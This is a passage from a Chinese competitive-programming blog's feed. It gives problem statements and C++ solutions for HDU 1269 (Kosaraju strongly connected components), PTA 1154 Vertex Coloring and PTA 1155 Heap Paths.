href="#Source" class="headerlink" title="Source"></a>Source</h2><blockquote><p><a href="http://acm.hdu.edu.cn/search.php?field=problem&amp;key=HDU+2006-4+Programming+Contest+&amp;source=1&amp;searchmode=source" target="_blank" rel="noopener">HDU 2006-4 Programming Contest</a></p></blockquote><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>如题。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>求强连通分量的模板题。</p><p>这里使用的是 Kosaraju 算法。</p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e4</span> + <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; g[maxn], rg[maxn];  <span class="comment">// 原图和反图</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; s;  <span class="comment">// 时间戳</span></span><br><span class="line"><span class="keyword">int</span> vis[maxn];</span><br><span class="line"><span class="keyword">int</span> sccno[maxn];</span><br><span class="line"><span class="keyword">int</span> cnt;  <span class="comment">// 强连通分量的个数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        g[i].clear();</span><br><span class="line">        rg[i].clear();</span><br><span class="line">    &#125;</span><br><span class="line">    cnt = <span class="number">0</span>;</span><br><span class="line">    s.clear();</span><br><span class="line">    <span class="built_in">memset</span>(sccno, <span class="number">0</span>, <span class="keyword">sizeof</span>(sccno));</span><br><span class="line">    <span class="built_in">memset</span>(vis, <span class="number">0</span>, <span class="keyword">sizeof</span>(vis));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs1</span><span class="params">(<span class="keyword">int</span> u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(vis[u]) <span class="keyword">return</span>;</span><br><span class="line">    vis[u] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; g[u].size(); ++i) &#123;</span><br><span class="line">        dfs1(g[u][i]);</span><br><span class="line">    &#125;</span><br><span class="line">    s.push_back(u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs2</span><span class="params">(<span class="keyword">int</span> u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sccno[u]) <span class="keyword">return</span>;</span><br><span class="line">    sccno[u] = cnt;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rg[u].size(); ++i) &#123;</span><br><span class="line">        dfs2(rg[u][i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Kosaraju</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        dfs1(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = n - <span class="number">1</span>; ~i; --i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!sccno[s[i]]) &#123;</span><br><span class="line">            ++cnt;</span><br><span class="line">            dfs2(s[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m) &#123;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span> &amp;&amp; m == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        init(n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> u, v;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; u &gt;&gt; v;</span><br><span class="line">            g[u].push_back(v);</span><br><span class="line">            rg[v].push_back(u);</span><br><span class="line">        &#125;</span><br><span class="line">        Kosaraju(n);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; (cnt == <span class="number">1</span>? <span class="string">"Yes"</span>: <span class="string">"No"</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目链接：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=1269&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;HDU 1269&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Problem-Description&quot;&gt;&lt;a href=&quot;#Problem-Description&quot; class=&quot;headerlink&quot; title=&quot;Problem Description&quot;&gt;&lt;/a&gt;Problem Description&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;为了训练小希的方向感，Gardon建立了一座大城堡，里面有N个房间(N&amp;lt;=10000)和M条通道(M&amp;lt;=100000)，每个通道都是单向的，就是说若称某通道连通了A房间和B房间，只说明可以通过这个通道由A房间到达B房间，但并不说明通过它可以由B房间到达A房间。Gardon需要请你写个程序确认一下是否任意两个房间都是相互连通的，即：对于任意的i和j，至少存在一条路径可以从房间i到房间j，也存在一条路径可以从房间j到房间i。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="ACM刷题" scheme="http://wutao18.github.io/tags/ACM%E5%88%B7%E9%A2%98/"/>
    
      <category term="强连通分量" scheme="http://wutao18.github.io/tags/%E5%BC%BA%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F/"/>
    
      <category term="图论" scheme="http://wutao18.github.io/tags/%E5%9B%BE%E8%AE%BA/"/>
    
      <category term="模板题" scheme="http://wutao18.github.io/tags/%E6%A8%A1%E6%9D%BF%E9%A2%98/"/>
    
      <category term="Kosaraju" scheme="http://wutao18.github.io/tags/Kosaraju/"/>
    
  </entry>
  
  <entry>
    <title>PTA 1154 Vertex Coloring</title>
    <link href="http://wutao18.github.io/2019/11/20/PTA-1154-Vertex-Coloring/"/>
    <id>http://wutao18.github.io/2019/11/20/PTA-1154-Vertex-Coloring/</id>
    <published>2019-11-20T14:38:37.000Z</published>
    <updated>2020-10-27T04:01:06.841Z</updated>
    
    <content type="html"><![CDATA[<p>题目链接：<a href="https://pintia.cn/problem-sets/994805342720868352/problems/1071785301894295552" target="_blank" rel="noopener">1154 Vertex Coloring</a></p><blockquote><p>A <strong>proper vertex coloring</strong> is a labeling of the graph’s vertices with colors such that no two vertices sharing the same edge have the same color. A coloring using at most $k$ colors is called a (proper) $k$-<strong>coloring</strong>.</p><p>Now you are supposed to tell if a given coloring is a proper $k$-coloring.</p></blockquote><a id="more"></a><h2 id="Input-Specification"><a href="#Input-Specification" class="headerlink" title="Input Specification:"></a>Input Specification:</h2><blockquote><p>Each input file contains one test case. For each case, the first line gives two positive integers $N$ and $M$ (both no more than $10​^4$), being the total numbers of vertices and edges, respectively. Then $M$ lines follow, each describes an edge by giving the indices (from $0$ to $N−1$) of the two ends of the edge.</p><p>After the graph, a positive integer $K (≤ 100)$ is given, which is the number of colorings you are supposed to check. Then $K$ lines follow, each contains $N$ colors which are represented by non-negative integers in the range of <strong>int</strong>. The $i$-th color is the color of the $i$-th vertex.</p></blockquote><h2 id="Output-Specification"><a href="#Output-Specification" class="headerlink" title="Output Specification:"></a>Output Specification:</h2><blockquote><p>For each coloring, print in a line <code>k-coloring</code> if it is a proper <code>k</code>-coloring for some positive <code>k</code>, or <code>No</code> if not.</p></blockquote><h2 id="Sample-Input-1"><a href="#Sample-Input-1" class="headerlink" title="Sample Input 1:"></a>Sample Input 1:</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">10 11</span><br><span class="line">8 7</span><br><span class="line">6 8</span><br><span class="line">4 5</span><br><span class="line">8 4</span><br><span class="line">8 1</span><br><span class="line">1 2</span><br><span class="line">1 4</span><br><span class="line">9 8</span><br><span class="line">9 1</span><br><span class="line">1 0</span><br><span class="line">2 4</span><br><span class="line">4</span><br><span class="line">0 1 0 1 4 1 0 1 3 0</span><br><span class="line">0 1 0 1 4 1 0 1 0 0</span><br><span class="line">8 1 0 1 4 1 0 5 3 0</span><br><span class="line">1 2 3 4 5 6 7 8 8 9</span><br></pre></td></tr></table></figure><h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output:"></a>Sample Output:</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4-coloring</span><br><span class="line">No</span><br><span class="line">6-coloring</span><br><span class="line">No</span><br></pre></td></tr></table></figure><h2 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h2><p>给定一个图，以及每个顶点的颜色，问是否所有边连接的两个顶点颜色不同。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>枚举每一条边即可。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e4</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; edges[maxn];</span><br><span class="line"><span class="keyword">int</span> colors[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> x, y;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; x &gt;&gt; y;</span><br><span class="line">        edges[i] = &#123;x, y&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; k;</span><br><span class="line">    <span class="keyword">while</span>(k--) &#123;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; mp;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; colors[i];</span><br><span class="line">            mp[colors[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> x = edges[i].first, y = edges[i].second;</span><br><span class="line">            <span class="keyword">if</span>(colors[x] == colors[y]) &#123;</span><br><span class="line">                flag = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; mp.size() &lt;&lt; <span class="string">"-coloring"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"No"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目链接：&lt;a href=&quot;https://pintia.cn/problem-sets/994805342720868352/problems/1071785301894295552&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;1154 Vertex Coloring&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A &lt;strong&gt;proper vertex coloring&lt;/strong&gt; is a labeling of the graph’s vertices with colors such that no two vertices sharing the same edge have the same color. A coloring using at most $k$ colors is called a (proper) $k$-&lt;strong&gt;coloring&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Now you are supposed to tell if a given coloring is a proper $k$-coloring.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="ACM刷题" scheme="http://wutao18.github.io/tags/ACM%E5%88%B7%E9%A2%98/"/>
    
      <category term="图论" scheme="http://wutao18.github.io/tags/%E5%9B%BE%E8%AE%BA/"/>
    
      <category term="枚举" scheme="http://wutao18.github.io/tags/%E6%9E%9A%E4%B8%BE/"/>
    
      <category term="STL" scheme="http://wutao18.github.io/tags/STL/"/>
    
  </entry>
  
  <entry>
    <title>PTA 1155 Heap Paths (DFS)</title>
    <link href="http://wutao18.github.io/2019/11/19/PTA-1155-Heap-Paths-DFS/"/>
    <id>http://wutao18.github.io/2019/11/19/PTA-1155-Heap-Paths-DFS/</id>
    <published>2019-11-19T13:16:29.000Z</published>
    <updated>2020-10-27T04:01:10.950Z</updated>
    
    <content type="html"><![CDATA[<p>题目链接：<a href="https://pintia.cn/problem-sets/994805342720868352/problems/1071785408849047552" target="_blank" rel="noopener">1155 Heap Paths (30 分)</a></p><blockquote><p>In computer science, a heap is a specialized tree-based data structure that satisfies the heap property: if P is a parent node of C, then the key (the value) of P is either greater than or equal to (in a max heap) or less than or equal to (in a min heap) the key of C. A common implementation of a heap is the binary heap, in which the tree is a complete binary tree. (Quoted from Wikipedia at <a href="https://en.wikipedia.org/wiki/Heap_(data_structure" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Heap_(data_structure</a>))</p><p>One thing for sure is that all the keys along any path from the root to a leaf in a max/min heap must be in non-increasing/non-decreasing order.</p><p>Your job is to check every path in a given complete binary tree, in order to tell if it is a heap or not.</p></blockquote><a id="more"></a><h2 id="Input-Specification"><a href="#Input-Specification" class="headerlink" title="Input Specification:"></a>Input Specification:</h2><blockquote><p>Each input file contains one test case. For each case, the first line gives a positive integer $N (1&lt;N≤1,000)$, the number of keys in the tree. Then the next line contains $N$ distinct integer keys (all in the range of int), which gives the level order traversal sequence of a complete binary tree.</p></blockquote><h2 id="Output-Specification"><a href="#Output-Specification" class="headerlink" title="Output Specification:"></a>Output Specification:</h2><blockquote><p>For each given tree, first print all the paths from the root to the leaves. Each path occupies a line, with all the numbers separated by a space, and no extra space at the beginning or the end of the line. The paths must be printed in the following order: for each node in the tree, all the paths in its right subtree must be printed before those in its left subtree.</p><p>Finally print in a line <code>Max Heap</code> if it is a max heap, or <code>Min Heap</code> for a min heap, or <code>Not Heap</code> if it is not a heap at all.</p></blockquote><h2 id="Sample-Input-1"><a href="#Sample-Input-1" class="headerlink" title="Sample Input 1:"></a>Sample Input 1:</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">98 72 86 60 65 12 23 50</span><br></pre></td></tr></table></figure><h2 id="Sample-Output-1"><a href="#Sample-Output-1" class="headerlink" title="Sample Output 1:"></a>Sample Output 1:</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">98 86 23</span><br><span class="line">98 86 12</span><br><span class="line">98 72 65</span><br><span class="line">98 72 60 50</span><br><span class="line">Max Heap</span><br></pre></td></tr></table></figure><h2 id="Sample-Input-2"><a href="#Sample-Input-2" class="headerlink" title="Sample Input 2:"></a>Sample Input 2:</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">8 38 25 58 52 82 70 60</span><br></pre></td></tr></table></figure><h2 id="Sample-Output-2"><a href="#Sample-Output-2" class="headerlink" title="Sample Output 2:"></a>Sample Output 2:</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">8 25 70</span><br><span class="line">8 25 82</span><br><span class="line">8 38 52</span><br><span class="line">8 38 58 60</span><br><span class="line">Min Heap</span><br></pre></td></tr></table></figure><h2 id="Sample-Input-3"><a href="#Sample-Input-3" class="headerlink" title="Sample Input 3:"></a>Sample Input 3:</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">10 28 15 12 34 9 8 56</span><br></pre></td></tr></table></figure><h2 id="Sample-Output-3"><a href="#Sample-Output-3" class="headerlink" title="Sample Output 3:"></a>Sample Output 3:</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10 15 8</span><br><span class="line">10 15 9</span><br><span class="line">10 28 34</span><br><span class="line">10 28 12 56</span><br><span class="line">Not Heap</span><br></pre></td></tr></table></figure><h2 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h2><p>给定一个长度为 $N$ 的数组，输出从根节点到叶子结点的每一条路径，并且判断是否是堆。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>直接 dfs 输出路径。设立两个变量 Max 和 Min 统计父节点比子节点大的个数和父节点比子节点小的个数。如果两者都不为 0，说明不是堆；如果 Max 为 0，说明是小顶堆，如果 Min 为 0，说明是大顶堆。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e3</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> arr[maxn];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> path[<span class="number">11</span>];  <span class="comment">// 保存路径</span></span><br><span class="line"><span class="keyword">int</span> Max = <span class="number">0</span>, Min = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> step, <span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">    path[step] = arr[id];</span><br><span class="line">    <span class="keyword">if</span>(id * <span class="number">2</span> &gt; n) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; step; ++i) &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; path[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; path[step] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> l = id * <span class="number">2</span>, r = id * <span class="number">2</span> + <span class="number">1</span>;  <span class="comment">// 左右儿子结点</span></span><br><span class="line">    <span class="keyword">if</span>(r &lt;= n) &#123;</span><br><span class="line">        <span class="keyword">if</span>(path[step] &lt; arr[r]) ++Min;</span><br><span class="line">        <span class="keyword">if</span>(path[step] &gt; arr[r]) ++Max;</span><br><span class="line">        dfs(step + <span class="number">1</span>, r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(l &lt;= n) &#123;</span><br><span class="line">        <span class="keyword">if</span>(path[step] &lt; arr[l]) ++Min;</span><br><span class="line">        <span class="keyword">if</span>(path[step] &gt; arr[l]) ++Max;</span><br><span class="line">        dfs(step + <span class="number">1</span>, l);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(Min == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Max Heap"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(Max == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Min Heap"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Not Heap"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目链接：&lt;a href=&quot;https://pintia.cn/problem-sets/994805342720868352/problems/1071785408849047552&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;1155 Heap Paths (30 分)&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In computer science, a heap is a specialized tree-based data structure that satisfies the heap property: if P is a parent node of C, then the key (the value) of P is either greater than or equal to (in a max heap) or less than or equal to (in a min heap) the key of C. A common implementation of a heap is the binary heap, in which the tree is a complete binary tree. (Quoted from Wikipedia at &lt;a href=&quot;https://en.wikipedia.org/wiki/Heap_(data_structure&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://en.wikipedia.org/wiki/Heap_(data_structure&lt;/a&gt;))&lt;/p&gt;
&lt;p&gt;One thing for sure is that all the keys along any path from the root to a leaf in a max/min heap must be in non-increasing/non-decreasing order.&lt;/p&gt;
&lt;p&gt;Your job is to check every path in a given complete binary tree, in order to tell if it is a heap or not.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="ACM刷题" scheme="http://wutao18.github.io/tags/ACM%E5%88%B7%E9%A2%98/"/>
    
      <category term="DFS" scheme="http://wutao18.github.io/tags/DFS/"/>
    
      <category term="堆" scheme="http://wutao18.github.io/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>HDU 2063 过山车 (匈牙利算法)</title>
    <link href="http://wutao18.github.io/2019/11/18/HDU-2063-%E8%BF%87%E5%B1%B1%E8%BD%A6-%E5%8C%88%E7%89%99%E5%88%A9%E7%AE%97%E6%B3%95/"/>
    <id>http://wutao18.github.io/2019/11/18/HDU-2063-%E8%BF%87%E5%B1%B1%E8%BD%A6-%E5%8C%88%E7%89%99%E5%88%A9%E7%AE%97%E6%B3%95/</id>
    <published>2019-11-18T12:49:28.000Z</published>
    <updated>2020-10-27T03:30:45.160Z</updated>
    
